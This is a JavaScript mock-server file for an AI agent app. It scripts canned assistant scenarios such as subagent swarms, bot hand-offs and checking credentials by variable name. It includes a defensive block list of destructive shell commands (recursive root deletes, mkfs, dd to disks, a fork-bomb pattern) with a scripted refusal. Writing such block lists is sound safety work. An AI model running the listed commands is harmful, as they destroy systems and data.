  const report = [`## ${target.name}`, `**Verdict:** ${verdict}`, `- ${finding}`, ...(level === 'major' || rnd() < 0.5 ? [`- ${other}`] : []),
    ...(fix ? [`**Fix:** ${fix}.`] : [])].join('\n');
  return {
    name: target.name, level, finding,
    prompt: `Audit ${p} (read-only). Look for panics on untrusted input, leftover TODOs, lint warnings and locks held across an await. Reply in at most 6 lines: verdict, findings with file:line, one fix.`,
    opener: `Checking ${p}.`,
    steps,
    wrap: level === 'clean' ? 'Nothing worth flagging. Short report.' : 'One thing worth fixing. Report it with the fix.',
    report,
    gist: level === 'clean' ? 'clean' : `${verdict}: ${finding.charAt(0).toLowerCase()}${finding.slice(1)}`,
    next: fix,
  };
}
/** A swarm child's turn: its 2–4 tool steps, then its report, in about `total` ms (fast streaming). */
function swarmChildScenario(task, total) {
  return async (t) => {
    const k = task.steps.length;
    const each = Math.max(250, Math.round((total - 1100 - k * 600) / k)); // ~600 ms of streaming per step
    for (const [i, s] of task.steps.entries()) {
      const exec = { ...s.call.exec, chunks: undefined, duration: Math.max(200, each + randInt(-150, 150)) };
      await t.step({ pace: SWARM_PACE, thinking: s.thinking, text: i === 0 ? task.opener : '', calls: [{ ...s.call, exec }] });
    }
    await t.step({ pace: SWARM_PACE, thinking: task.wrap, text: task.report });
  };
}
const swarmStartedText = (n) => md`
I've started ${n} subagents in the background, one per check. ${MAX_SUBAGENTS} run at a time and the rest wait for a free slot, so the whole batch takes about a minute.

Each one is read-only and reports back here in a few lines. I'll sum up once all ${n} are in; open any of them to watch it work.`;
/** The parent's wrap-up of a swarm: counts per verdict, what needs attention, one order of work. */
function swarmSummary(intro, agents) {
  const done = agents.filter((a) => a.result?.ok);
  const of = (level) => done.filter((a) => a.task.level === level);
  const [clean, minor, major] = [of('clean'), of('minor'), of('major')];
  const stopped = agents.length - done.length;
  const short = (a) => a.name.replace(/^[^:]*: /, '');
  const parts = [`${intro} **${clean.length} clean**, **${minor.length}** with a minor issue, **${major.length}** that need attention${stopped ? `, and ${stopped} that did not finish` : ''}.`];
  if (major.length) parts.push(`**Needs attention**\n${major.map((a) => `- **${short(a)}:** ${a.task.finding}; ${a.task.next}`).join('\n')}`);
  if (minor.length) parts.push(`**Minor** (${minor.map(short).join(', ')}): leftover TODOs, needless clones and noisy logs. Worth one sweep, not urgent.`);
  parts.push(`**What I'd do next:** ${major.length ? `fix the ${major.length === 1 ? 'one' : major.length} above on a branch, with a test each, then sweep the minor ones.` : minor.length ? 'sweep the minor ones in one small PR; nothing is urgent.' : 'nothing; the workspace is in good shape.'} Want me to start?`);
  return parts.join('\n\n');
}
/** "swarm|fan out|30 subagents": 32 read-only subagents in the background, 4 at a time. */
async function scenarioSwarm(t, text, rec) {
  const tasks = SWARM_TARGETS.map((target) => {
    const task = swarmTask(target);
    return { ...task, scenario: () => swarmChildScenario(task, randInt(4000, 9000)) };
  });
  const n = tasks.length;
  await t.step({
    thinking: `${n} small, independent checks. Fan them out to read-only subagents in the background; the server runs ${MAX_SUBAGENTS} at a time and queues the rest, so start them all at once and don't poll.`,
    text: `That's ${n} independent checks, so I'll fan them out to read-only subagents. ${MAX_SUBAGENTS} run at a time; the rest wait for a slot.`,
    calls: [{
      name: 'agent',
      args: { tasks: tasks.map(({ name, prompt }) => ({ name, prompt, readonly: true })), wait: false },
      exec: { duration: 250, run: () => spawnBackground(rec, tasks, [], { summary: scenarioSwarmSummary }) },
    }],
  });
  await t.step({ thinking: 'They are queued and running. Say what I started and that I will sum up at the end; no polling.', text: swarmStartedText(n) });
}
async function scenarioSwarmSummary(t, batch) {
  const n = batch.agents.length;
  const all = batch.agents.every((a) => a.result?.ok);
  await t.step({
    thinking: `All ${n} reports are in. Count the verdicts, surface only what needs attention, and propose one order of work.`,
    text: swarmSummary(all ? `All ${n} reports are in.` : `All ${n} subagents have reported back, but not all of them finished.`, batch.agents),
  });
}

const SCENARIOS = [
  [/\bthink in parts\b/i, scenarioThoughts],
  [/\b(write|make|take|jot)\s+(me\s+)?(a\s+)?notes?\b|\bnote\s+(this|that|it)\s+down\b/i, scenarioNote],
  [/\b(look at|what do you see|can you see)\b/i, scenarioLook],
  [/\b(sketch|illustrate)\b/i, (t, text, rec) => scenarioWhiteboard(t, text, rec, { quiet: true })],
  [/\b(whiteboard|visuali[sz]e|diagram|topology|board|sign|signature)\b/i, scenarioWhiteboard],
  [/\bstream/i, scenarioStream],
  [/\bflood/i, scenarioFlood],
  [/\b(swarm|fan[ -]?out|30 subagents)/i, scenarioSwarm],
  [/\b(subagents?|parallel|delegate|research)/i, scenarioSubagents],
  [/\bnuke\b/i, scenarioNuke],
  [/\bdemo/i, scenarioDemo],
  [/\b(error|fail)/i, scenarioError],
  [/\b(delete|approve|deploy)|\brm\s/i, scenarioApproval],
  [/\b(edit|fix|refactor)/i, scenarioEdit],
  [/\b(test|run|build)/i, scenarioBash],
  [/\blong/i, scenarioLong],
];
/** The chat's model is on a model server of the user's that is switched off (`POST /__mock/provider-offline`). */
function offlineProvider(rec) {
  const ref = rec.info.model ?? state.serverInfo.default_model;
  return state.providers.find((p) => p.id === ref?.provider && p.offline) ?? null;
}
/** Like providers.rs: `Desk PC isn't answering at 192.168.1.20:8080`. */
function notAnswering(p) {
  let place = p.base_url;
  try { place = new URL(p.base_url).host; } catch { /* as it is */ }
  return `${p.name || p.id} isn't answering at ${place}`;
}
/** A turn on a switched-off server: the engine retries (a PC waking up), then fails in plain words. */
async function scenarioOffline(t, _text, rec) {
  const p = offlineProvider(rec);
  addEntry(rec, { kind: 'notice', level: 'warning', text: `${notAnswering(p)} — retrying in 2s (attempt 1/10)` });
  await t.sleep(900);
  if (p.offline) throw { turnFailed: `Model request failed: ${notAnswering(p)} — start it, or pick another model for this chat.` };
  await scenarioDefault(t, _text, rec);
}
function pickScenario(text, rec) {
  if (offlineProvider(rec)) return scenarioOffline;
  if (rec.info.private) return scenarioPrivate; // web search only: no files, shell, bots or subagents
  if (rec.info.kind === 'channel') return scenarioRoom;
  if (findBotTarget(text, sessionBot(rec))) return scenarioMessageBot; // "ask @forge …" (bot chats and plain chats)
  if (secretsUsedBy(text).length) return scenarioSecret; // "check $GITHUB_PASSWORD still works"
  const run = SCENARIOS.find(([re]) => re.test(text))?.[1] ?? scenarioDefault;
  // Subagents off for this chat: the model isn't offered the `agent` tool.
  if (rec.info.subagents === false && (run === scenarioSubagents || run === scenarioSwarm)) return scenarioAlone;
  return run;
}
/** "think in parts": reasoning in several parts, some empty (hidden reasoning), streamed slowly; one block on screen. */
async function scenarioThoughts(t) {
  await t.step({
    thoughts: ['', 'First, the logs: the errors start right after the deploy.', null, '', 'Then the config: the new timeout is far too short.', null, ''],
    pace: { think: 18, text: 60 },
    text: 'The new timeout is too short; raise it back to 30 s.',
  });
}
/** Subagents are off in this chat: the work is done without delegating. */
async function scenarioAlone(t) {
  await t.step({ thinking: "Subagents are off in this chat, so I'll do it myself, step by step.", text: "I'll handle this myself here (subagents are off in this chat). Here's what I found: nothing that needs a helper." });
}

// ─── secrets used by commands (auth.rs secrets_for / mark_used) ─────────────
/** `$VAR` / `${VAR}` names in a shell command (auth.rs referenced_vars). */
function referencedVars(command) {
  const out = new Set();
  for (const m of String(command ?? '').matchAll(/\$(?:\{([A-Za-z0-9_]+)\}|([A-Za-z0-9_]+))/g)) out.add(m[1] ?? m[2]);
  return out;
}
/** The environment variables a secret provides: `$NAME`, or `$NAME_<FIELD>` with `totp` as `$NAME_OTP`. */
function secretVars(name, s) {
  if (s.kind === 'token') return [name];
  return Object.keys(s.fields).map((f) => (f === 'totp' ? `${name}_OTP` : `${name}_${f.toUpperCase()}`));
}
/** [name, secret] of every secret whose variables `command` names that this chat (`rec`, when given) may use
 * on the server: any-chat secrets, or ones for its bot; never in private chats. */
function secretsUsedBy(command, rec) {
  const refs = referencedVars(command);
  if (!refs.size) return [];
  const bot = rec?.info?.bot_id ?? null;
  const may = (s) => !rec || (!rec.info?.private && s.on_server !== false && (!s.bots || (bot && s.bots.includes(bot))));
  return [...state.secrets].filter(([name, s]) => may(s) && secretVars(name, s).some((v) => refs.has(v)));
}
/** A bash call started: remember that it used these secrets (Settings shows "last used"). */
function markSecretsUsed(command) {
  const t = now();
  for (const [, s] of secretsUsedBy(command)) s.last_used = t;
}
/** A message naming a secret's variables: call the service with them (names only, never the values). */
async function scenarioSecret(t, text) {
  const used = secretsUsedBy(text);
  const known = new Set(used.flatMap(([n, s]) => secretVars(n, s)));
  const vars = [...referencedVars(text)].filter((v) => known.has(v));
  const host = used.find(([, s]) => s.hosts.length)?.[1].hosts[0] ?? 'api.example.com';
  const pass = vars.find((v) => v.endsWith('_PASSWORD'));
  const user = pass?.replace(/_PASSWORD$/, '_USERNAME');
  const auth = [
    ...(pass ? [`-u "$${user}:$${pass}"`] : []),
    ...vars.filter((v) => v !== pass && v !== user).map((v) => (v.endsWith('_OTP') ? `-H "X-OTP: $${v}"` : `-H "Authorization: Bearer $${v}"`)),
  ].join(' ');
  const names = used.map(([n]) => `\`${n}\``).join(' and ');
  const [r] = await t.step({
    thinking: `They want me to use ${vars.map((v) => `$${v}`).join(', ')}. Secrets reach commands as environment variables and are scrubbed from output, so name the variables and never echo the values.`,
    text: `I'll check against ${host}. The command only names the variables, so the values never show up here.`,
    calls: [bashCall(`curl -s -o /dev/null -w "%{http_code}\\n" ${auth} https://${host}/`, '200')],
  });
  await t.step({
    thinking: r.denied ? 'Denied. Nothing ran, so nothing used the secret.' : 'HTTP 200: the credentials work. Say so briefly.',
    text: r.denied ? `OK, I didn't run it, so ${names} ${used.length === 1 ? 'was' : 'were'} not used.`
      : `${host} answered **200**, so ${names} ${used.length === 1 ? 'works' : 'work'}. Settings → Privacy & safety → Passwords & keys now shows ${used.length === 1 ? 'it' : 'them'} as used just now.`,
  });
}

// ─── safety: catastrophic commands ──────────────────────────────────────────
const REFUSED_TEXT = 'Refused: this command could destroy the system and is blocked in every permission mode, including YOLO.';
/** True for commands no permission mode may run: rm -r of / ~ /*, mkfs, dd onto a disk, fork bombs. */
function isCatastrophic(command) {
  const c = String(command ?? '');
  for (const raw of c.split(/&&|\|\||[;\n|]/)) {
    const seg = raw.trim().replace(/^sudo\s+/, '');
    if (/^mkfs(\.\w+)?(\s|$)/.test(seg)) return true;
    if (/^dd\s.*\bof=\/dev\/(sd|hd|vd|xvd|nvme|mmcblk|disk)/.test(seg)) return true;
    const m = seg.match(/^(?:\/(?:usr\/)?bin\/)?rm\s+(.*)$/);
    if (!m) continue;
    const args = m[1].split(/\s+/).filter(Boolean);
    const recursive = args.some((a) => /^-[a-zA-Z]*[rR]/.test(a) || a === '--recursive');
    const targets = args.filter((a) => !a.startsWith('-')).map((a) => a.replace(/^["']|["']$/g, ''));
    if (recursive && targets.some((a) => /^(\/+\*?|\/\.\*?|~\/?\*?|\$\{?HOME\}?\/?\*?)$/.test(a))) return true;
  }
  if (/>\s*\/dev\/(sd[a-z]|nvme\d|hd[a-z]|vd[a-z]|mmcblk\d)/.test(c)) return true;
  if (/:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/.test(c)) return true;
  return false;
}
const NUKE_ANSWER = md`
The harness refused it, and that's by design: \`rm -rf /\` is on the short list of **catastrophic commands** that are blocked in every permission mode, **YOLO included**. Nothing was deleted.

The list covers:

- recursive deletes of \`/\`, \`/*\` or your home directory
- formatting disks (\`mkfs\`) and raw writes to block devices (\`dd of=/dev/sd…\`)
- fork bombs

YOLO means *nothing asks*, not *anything goes*. If you want to clean something up, name it (for example \`target/\` or \`node_modules/\`) and I'll remove just that.`;

// ─── bots: personas, private messages and rooms ─────────────────────────────
const MAX_ROOM_TURNS = 8;
const TOOL_PRESETS = ['full', 'coding', 'research', 'assistant', 'read_only', 'custom'];
const RESERVED_HANDLES = new Set(['user', 'you', 'all', 'everyone', 'here', 'tessera', 'main']);
const BOT_PALETTE = ['#a48bff', '#efb15a', '#5b9dff', '#4cc38a', '#f06a8a', '#3fb8c9', '#e5795a', '#c07bf0'];
const botById = (id) => state.bots.find((b) => b.id === id);
const botByHandle = (h) => state.bots.find((b) => b.handle === String(h).toLowerCase());
/** The bot a chat or duty session talks to; null for plain chats, channels, and deleted bots. */
const sessionBot = (rec) => (rec.info.kind !== 'channel' && rec.info.bot_id ? botById(rec.info.bot_id) ?? null : null);
function normHandle(s) {
  return String(s ?? '').normalize('NFKD').replace(/[̀-ͯ]/g, '').trim().replace(/^@+/, '').toLowerCase()
    .replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '').slice(0, 24);
}
/** DM title: "@nova ↔ @forge", or "Your chats → @forge" when a plain (non-bot) chat's agent wrote. */
const dmTitle = (sender, recipient) => (sender ? `@${sender.handle} ↔ @${recipient.handle}` : `Your chats → @${recipient.handle}`);
/** bots.rs may_hand_to: the recipient takes work from others (`askable`), and the sender's `can_message` allows
 * it, or (a plain chat) chats may hand work to bots (get_security's `bot_handoff` isn't "off"). */
const canMessage = (sender, recipient) =>
  recipient.askable !== false && (sender ? sender.can_message.includes('*') || sender.can_message.includes(recipient.handle) : settingsState().security.bot_handoff !== 'off');
/** Why a hand-off is refused, in the server's words (engine.rs message_bot). */
function handoffRefusal(sender, recipient) {
  if (recipient.askable === false) return `@${recipient.handle} takes work only from the user, not from other chats or bots (its settings). Do it here, or ask the user to talk to it.`;
  if (!sender) return 'Chats may not hand work to bots: the user turned that off (Settings → Privacy & safety). Do it here, or ask the user to talk to the bot.';
  return `${sender.name} is not allowed to message @${recipient.handle}`;
}
/** Which voice a bot answers in, from its tool preset. */
function persona(bot) {
  switch (bot?.tools) {
    case 'assistant': return 'planner';
    case 'coding': case 'full': return 'engineer';
    case 'research': case 'read_only': return 'researcher';
    default: return 'generic';
  }
}
const MENTION_RE = /(?<![\w@])@([a-z0-9_-]+)/gi;
const withoutMentions = (text) => String(text ?? '').replace(MENTION_RE, '').replace(/\s+/g, ' ').trim();
/** The user's words, trimmed for quoting back. */
const quoteOf = (text, n = 110) => truncate(stripMarkdown(withoutMentions(text)), n) || 'this';
const STOPWORDS = new Set(('the a an and or but if then so to of in on at for with about from into by is are was were be been it its this that these those ' +
  'what which who how why when where do does did can could should would will just me my you your we our they them their please any some there here ' +
  'have has had not no yes also more most other than as up out get put let make thoughts think know want need like hi hello hey').split(' '));
function keywords(text, n = 5) {
  const words = stripMarkdown(withoutMentions(text)).toLowerCase().match(/[a-z0-9][a-z0-9+#-]*/g) ?? [];
  return uniq(words.filter((w) => w.length > 2 && !STOPWORDS.has(w))).slice(0, n);
}
const isGreeting = (text) => {
  const t = withoutMentions(text);
  return /^(hi|hello|hey|yo|hiya|howdy|morning|good (morning|afternoon|evening))\b/i.test(t) && t.split(/\s+/).length <= 4;
};
function mentionsIn(text, members) {
  const out = [];
  for (const m of String(text ?? '').matchAll(MENTION_RE)) {
    const bot = members.find((b) => b.handle === m[1].toLowerCase());
    if (bot && !out.includes(bot)) out.push(bot);
  }
  return out;
}

// Fictional sources (reserved .example domains) for web_search results and Scout's answers.
const SOURCES = [
  { title: 'Rooms, not pipelines: how Hivemind runs agent teams', url: 'https://hivemind.example/blog/rooms', note: 'agents share a thread and @mention each other to hand off, with a cap on turns per message' },
  { title: 'Quorum 0.9 release notes', url: 'https://quorum.example/changelog/0.9', note: 'private agent-to-agent threads the user can audit; each agent keeps its own tools and memory' },
  { title: 'Separation of duties for LLM agents', url: 'https://papers.example/abs/2604.01123', note: 'narrow per-agent toolsets cut harmful tool calls noticeably in their evaluations' },
  { title: 'Relay docs: the supervisor pattern', url: 'https://relay.example/docs/supervisor', note: 'one coordinator talks to the user; the workers never do' },
  { title: 'Long-context local models, measured', url: 'https://bench.example/posts/long-context-2026', note: 'quality drops sharply past about 32k tokens on most 20–30B models' },
  { title: 'Designing reconnect-safe streaming APIs', url: 'https://eng.example/streaming-resync', note: 'persist first, broadcast second; clients resync by sequence number' },
  { title: 'What self-hosters want from agent tools (survey)', url: 'https://survey.example/2026/self-hosted-agents', note: 'approvals from the phone and model choice rank above raw capability' },
];
function pickSources(seed, n = 3) {
  const h = hashStr(seed);
  return Array.from({ length: Math.min(n, SOURCES.length) }, (_, i) => SOURCES[(h + i * 3) % SOURCES.length]);
}
const capFirst = (s) => s.charAt(0).toUpperCase() + s.slice(1);
function searchResultText(query, sources) {
  return `${sources.length} results for "${query}"\n\n` + sources.map((s, i) => `${i + 1}. ${s.title}\n   ${s.url}\n   ${capFirst(s.note)}.`).join('\n\n');
}
const sourceBullets = (sources) => sources.map((s) => `- [${s.title}](${s.url}): ${s.note}`).join('\n');
const webSearchCall = (query, sources) => ({ name: 'web_search', args: { query }, exec: { duration: 900, text: searchResultText(query, sources) } });
const calendarCall = (args, text) => ({ name: 'calendar', args, exec: { duration: 500, text } });
const recallCall = (query) => ({
  name: 'recall', args: { query },
  exec: {
    duration: 450,
    text: [
      `2 matches for "${query}"`,
      '- Launch planning · 1 hour ago: "Nice. Nova, put the launch checklist on my Thursday."',
      '- Plan my week · yesterday: "Launch is Thursday, and I want two focused mornings for the Android layout work."',
    ].join('\n'),
  },
});
const CHECK_OUTPUT = [
  ...['proto', 'core', 'client', 'server', 'cli'].map((c) => `    Checking tessera-${c} v0.1.0 (/home/user/projects/tessera/crates/${c})`),
  '    Finished `dev` profile [unoptimized + debuginfo] target(s) in 3.41s',
].join('\n');
const GIT_LOG_OUTPUT = [
  '9f2c1e4 store: move search to FTS5',
  '4b7a0d2 client: wait for entry_added in the reconnect test',
  'e13c9a8 server: treat lagged receivers as a resync hint',
  '7d5f2b1 ui: container queries for the app shell',
  '2a8e6c0 ci: split test and lint jobs',
].join('\n');

/** Runs a reply: one step, or a tool step (`pre` + `calls`) followed by the answer (`after` + `text`). */
async function speak(t, r, extra = {}) {
  if (!r.calls?.length) {
    await t.step({ ...extra, thinking: r.thinking, text: r.text });
    return [];
  }
  const results = await t.step({ ...extra, thinking: r.thinking, text: r.pre, calls: r.calls });
  await t.step({ ...extra, thinking: r.after, text: r.text });
  return results;
}

function briefingText() {
  return md`
Good morning! Here's your briefing.

**Calendar**
- 09:30 stand-up, 14:00 design review (foldable layout)
- Free after 14:30; tomorrow morning is held for the Android layout work
- Thursday: launch checklist at 10:00, launch at 16:00

**Inbox:** one thing is urgent: the domain renewal notice expires in 5 days. Two invoices can wait until Friday.

**Build:** Forge says main is green (21 of 21 tests passing).

**News you follow**
- A new llama.cpp release speeds up prompt processing on long contexts
- The reconnect-safe streaming write-up you bookmarked has a follow-up on resync strategies

Have a lovely day! Shall I draft a reply to the renewal notice?`;
}
function digestText(sources) {
  return md`
## This week's digest

${sources.map((s, i) => `${i + 1}. [${s.title}](${s.url}): ${s.note}`).join('\n')}

Most relevant for Tessera: the first two, since both describe patterns we ship. Confidence: high on the release notes, medium on the benchmarks.`;
}

/** A bot's answer in its own chat or duty run (the default scenario), in its voice. */
function botChatReply(bot, text) {
  const q = quoteOf(text);
  const kw = keywords(text);
  const greet = isGreeting(text);
  switch (persona(bot)) {
    case 'planner': {
      if (greet) return {
        thinking: 'A hello. Keep it warm and short: the one thing that matters this week, then offer help.',
        text: md`
Hi! Lovely to hear from you. Here's where things stand:

- **Today:** stand-up at 09:30 and a design review at 14:00; the rest of the afternoon is free
- **This week:** the launch is on Thursday, and the checklist is already on your calendar

Want a proper rundown of today, or is there something I can take off your plate?`,
      };
      const briefing = /\bbrief/i.test(text);
      if (briefing || /\b(today|calendar|week|schedule|plan|remind|agenda|morning|tomorrow|meeting)/i.test(text)) return {
        thinking: `They asked: "${truncate(q, 90)}". Check the calendar before suggesting anything, so nothing gets double-booked.`,
        pre: briefing ? 'Pulling today together.' : 'Let me check your calendar first.',
        calls: [calendarCall({ action: 'list', range: /\bweek\b/i.test(text) ? 'this week' : 'today' }, CAL_TODAY)],
        after: 'Two meetings today, a free afternoon, launch on Thursday. Lead with the plan, flag the one risk, offer a next step.',
        text: briefing ? briefingText() : md`
Here's what I'd suggest for *"${q}"*:

1. **08:45–09:15:** inbox and anything urgent, so it doesn't follow you around
2. **10:00–12:00:** the real work, meeting-free (I'll hold the time)
3. **14:00:** design review (30 minutes)
4. **15:00 onwards:** launch prep, with Forge's build status in hand

One thing to watch: Thursday is launch day, so I'd keep tomorrow afternoon light. Shall I block it off?`,
      };
      return {
        thinking: `"${truncate(q, 90)}". Say what I'll do, when, and who else is needed. Short, and offer to set it up.`,
        text: md`
Of course! Here's how I'd handle *"${q}"*:

- **First:** I'll note it with a due date before Thursday's launch, so it doesn't slip
- **Then:** a reminder tomorrow at 09:00, and it goes into your morning briefing
- **If it needs Forge or Scout,** I'll ask them directly and report back

Want me to go ahead and set that up?`,
      };
    }
    case 'engineer': {
      if (greet) return {
        thinking: 'Greeting. Give status, ask for the task.',
        text: md`
Hey. Tree's clean:

~~~sh
$ git status --short
$ cargo check --workspace
    Finished \`dev\` profile [unoptimized + debuginfo] target(s) in 3.41s
~~~

What are we fixing?`,
      };
      return {
        thinking: `"${truncate(q, 90)}". Don't speculate: point at where to look, give the commands, offer to do it on a branch.`,
        text: md`
Re *"${q}"*: check two things before anyone writes code.

~~~sh
rg -n "${kw[0] ?? 'TODO'}" crates/ apps/tessera/ui/src
cargo test --workspace -q 2>&1 | tail -n 3
~~~

- \`rg\` finds nothing: it isn't built yet. I add it behind a test.
- Tests red: that's the real problem. Fix that first.

Say "go" and I'll do it on a branch.`,
      };
    }
    case 'researcher': {
      const sources = pickSources(text);
      if (greet) return {
        thinking: 'Greeting. Say what I can dig into, with a couple of recent finds as examples.',
        text: md`
Hi. What should I dig into? "Compare X and Y", "what's new in Z" and "find the primary source for …" all work well.

Two recent finds, in case they're useful:

${sourceBullets(sources.slice(0, 2))}`,
      };
      const digest = /\bdigest\b/i.test(text);
      const found = digest ? pickSources(text, 5) : sources;
      const query = kw.join(' ') || q;
      return {
        thinking: `Search for "${query}", then lead with the short version and link every claim.`,
        pre: 'Searching.',
        calls: [webSearchCall(query, found)],
        after: 'The sources mostly agree on the direction, less on the details. Short version first, then links, then confidence.',
        text: digest ? digestText(found) : md`
**Short version:** on *"${q}"*, most sources say to start with the simplest approach that works and add complexity only once real usage demands it.

${sourceBullets(found)}

Confidence: medium. They agree on the direction but not on the details. Want a longer digest with quotes?`,
      };
    }
    default: return {
      thinking: `"${truncate(q, 90)}". Answer as ${bot.name}${bot.role ? ` (${bot.role})` : ''}; keep it short.`,
      text: `${bot.name} here. On *"${q}"*: I'd start small, check the result, and report back.${bot.role ? ` That's squarely my job: ${bot.role.charAt(0).toLowerCase()}${bot.role.slice(1)}.` : ''} Want me to go ahead?`,
    };
  }
}

// ── private bot-to-bot messages (message_bot) ──
const ASK_RE = /\b(ask|tell|message|ping)\s+@?([a-z0-9_-]+)/gi;
const DM_CLOSING = "A short answer is fine; I'll pass it on.";
/** "ask @forge whether…" → the bot being addressed (never the speaker itself), or null. */
function findBotTarget(text, self) {
  for (const m of String(text ?? '').matchAll(ASK_RE)) {
    const bot = botByHandle(m[2]);
    if (bot && bot.id !== self?.id) return { recipient: bot, verb: m[1].toLowerCase(), rest: text.slice(m.index + m[0].length).split('\n')[0] };
  }
  return null;
}
function composeDm(recipient, verb, rest) {
  const r = truncate(rest.replace(/^[\s,:;.-]+/, '').replace(/[\s?.!]+$/, ''), 200);
  let body;
  if (!r) body = 'the user asked me to check in with you. Anything they should know?';
  else if (/^to\s/i.test(r)) body = `the user would like you to ${r.replace(/^to\s+/i, '')}.`;
  else if (/^(whether|if|what|how|why|when|where|who|which|about)\b/i.test(r)) body = `the user wants to know ${r}.`;
  else if (/^that\b/i.test(r)) body = `the user wants you to know ${r}.`;
  else if (verb === 'ask') body = `the user asked me to check with you: ${r}?`;
  else body = `passing on a message from the user: "${r}".`;
  return `Hi ${recipient.name}, ${body} ${DM_CLOSING}`;
}
/** The recipient's reply in the DM, using its own tools. */
function dmReply(recipient, sender, message) {
  const from = sender?.name ?? 'Tessera';
  const core = message.replace(/^Hi \S+, /, '').replace(DM_CLOSING, '').trim(); // what was actually asked
  const q = truncate(stripMarkdown(core), 90);
  switch (persona(recipient)) {
    case 'engineer':
      if (/\b(green|tests?|build|ci|flaky|broken|pass(ing)?|failing|main)\b/i.test(core)) return {
        thinking: `${from} wants build status. Run the suite rather than trusting the last CI badge.`,
        pre: 'Running the suite.',
        calls: [bashCall('cargo test --workspace', WORKSPACE_TEST_OUTPUT)],
        after: '21 passed, 0 failed. One line.',
        text: 'Green: 21 passed, 0 failed, 14.8s. Nothing flaky since the reconnect fix landed.',
      };
      return {
        thinking: `${from} is asking something code-adjacent. Check recent history, answer in two lines.`,
        pre: 'Checking recent history.',
        calls: [bashCall('git log --oneline -5', GIT_LOG_OUTPUT)],
        after: 'Nothing risky in recent history.',
        text: /wants you to know|passing on a message/i.test(core)
          ? 'Noted. Nothing in the last five commits depends on it, so nothing changes on my side.'
          : `Checked. Nothing in the last five commits gets in the way. Re "${q}": doable, about half a day on a branch with tests. I'll start when the user says go.`,
      };
    case 'researcher': {
      const sources = pickSources(message, 2);
      return {
        thinking: `${from} needs sources, not opinions. Search, then two links and a one-line summary.`,
        pre: 'Searching.',
        calls: [webSearchCall(keywords(core).join(' ') || q, sources)],
        after: 'Two good sources. Keep it short.',
        text: `Two sources worth passing on:\n\n${sourceBullets(sources)}\n\nShort version: start small and measure. Confidence: medium.`,
      };
    }
    case 'planner': return {
      thinking: `${from} needs a scheduling answer. Check the calendar, then reply with free time.`,
      pre: 'Checking the calendar.',
      calls: [calendarCall({ action: 'list', range: 'this week' }, CAL_TODAY)],
      after: 'Free after 14:30 today; tomorrow morning is held; Thursday is the launch.',
      text: `Happy to help! The user is free after 14:30 today, tomorrow morning is held for focus work, and Thursday is launch day, so this afternoon is the best slot for "${q}". Want me to hold it?`,
    };
    default: return { thinking: `${from} asked: "${q}". Answer briefly.`, text: `Got it. Re "${q}": I'll handle it and report back.` };
  }
}
function relayText(sender, recipient, reply) {
  let quoted = '';
  for (const para of reply.trim().split(/\n{2,}/)) {
    if (quoted && quoted.length + para.length > 600) break;
    quoted += (quoted ? '\n\n' : '') + para;
  }
  quoted = quoted.split('\n').map((l) => `> ${l}`.trimEnd()).join('\n');
  switch (persona(sender)) {
    case 'planner': return `${/\bgreen\b/i.test(reply) ? 'Good news! ' : ''}${recipient.name} got back to me:\n\n${quoted}\n\nI'll fold that into tomorrow's briefing. Anything else you'd like me to chase?`;
    case 'engineer': return `${recipient.name}:\n\n${quoted}\n\nNoted.`;
    case 'researcher': return `${recipient.name} replied:\n\n${quoted}\n\nLogged in my notes for the next digest.`;
    default: return `${recipient.name} replied:\n\n${quoted}\n\nThe full exchange is in the private conversation with @${recipient.handle}.`;
  }
}
function refusedRelay(sender, recipient) {
  switch (persona(sender)) {
    case 'planner': return `I'm afraid I can't message ${recipient.name} directly: my settings don't allow it. You can ask ${recipient.name} yourself, or add @${recipient.handle} to my **Can message** list.`;
    case 'engineer': return `Can't. I'm not allowed to message @${recipient.handle}. Ask ${recipient.name} yourself, or add @${recipient.handle} to my *Can message* list.`;
    default: return `I can't reach ${recipient.name}: @${recipient.handle} isn't on my *Can message* list. You could ask directly, or allow it in my settings.`;
  }
}
/** The DM channel between two bots (either direction), or between the plain agent and a bot. */
function findOrCreateDm(sender, recipient) {
  const pair = sender ? [sender.id, recipient.id] : [recipient.id];
  const same = (ids) => ids.length === pair.length && pair.every((id) => ids.includes(id));
  for (const rec of state.sessions.values()) {
    const i = rec.info;
    if (i.kind === 'channel' && i.bot_id && same(i.members) && (sender || i.bot_id === recipient.id)) return rec;
  }
  return createSession({
    kind: 'channel', title: dmTitle(sender, recipient), bot_id: recipient.id, members: pair,
    cwd: recipient.cwd, model: recipient.model ?? null, thinking: recipient.thinking ?? 'medium', permission: recipient.permission,
  });
}
/** Streams the recipient's reply in the DM; resolves with { text, is_error } once it is done. */
function runDmReply(dm, sender, recipient, message, from) {
  return new Promise((resolve) => {
    if (dm.turn || dm.compactTimer) return resolve({ text: `${recipient.name} is busy with another conversation; try again in a moment.`, is_error: true });
    // Never the user's: the asking bot, or the plain chat whose agent asked (`chat:<id>`).
    addEntry(dm, { kind: 'user', content: [{ type: 'text', text: message }], author: sender ? sender.id : `chat:${from.info.id}` });
    dm.info.preview = computePreview(dm.entries);
    dm.info.status = 'running';
    emitSession(dm);
    const voice = { author: recipient.id, model: recipient.model ?? dm.info.model };
    startTurn(dm, message, (t) => speak(t, dmReply(recipient, sender, message), voice), (outcome) => {
      const last = dm.entries.findLast((e) => e.kind === 'assistant' && e.author === recipient.id);
      if (outcome === 'ok') resolve({ text: textOf(last?.content).trim() || '(no reply)', is_error: false, outcome });
      else resolve({ text: `${recipient.name} ${outcome === 'aborted' ? 'was interrupted before answering' : 'hit an error while answering'}.`, is_error: true, outcome });
    });
  });
}
/** engine/handoffs.rs may_hand_off_in_background: not subagents, jobs, rooms or a bot answering a bot (they wait). */
const mayHandOffInBackground = (rec) => !rec.info.parent_id && rec.info.kind !== 'subagent' && rec.info.kind !== 'job' && rec.info.kind !== 'channel';
/** handoffs.rs reply_header: "[Reply from @forge · 12 s · session …]" (the apps read it). */
function replyHeader(handle, ms, dmId) {
  const s = Math.floor(ms / 1000);
  const took = s < 60 ? `${s} s` : s < 3600 ? `${Math.floor(s / 60)} min` : `${Math.floor(s / 3600)} h ${Math.floor((s % 3600) / 60)} min`;
  return `[Reply from @${handle} · ${took} · session ${dmId}]`;
}
/**
 * `message_bot` in the background (handoffs.rs hand_to_bot): the bot works in its DM, marked `working_for` the
 * asking chat and call, and the call returns at once. When the bot is done, its reply lands in the asking chat as a
 * message from the bot (read at its next step while it works), and the chat goes on with it; stopped (the DM's Stop,
 * or the asking chat's), it says so and the chat waits for the user.
 */
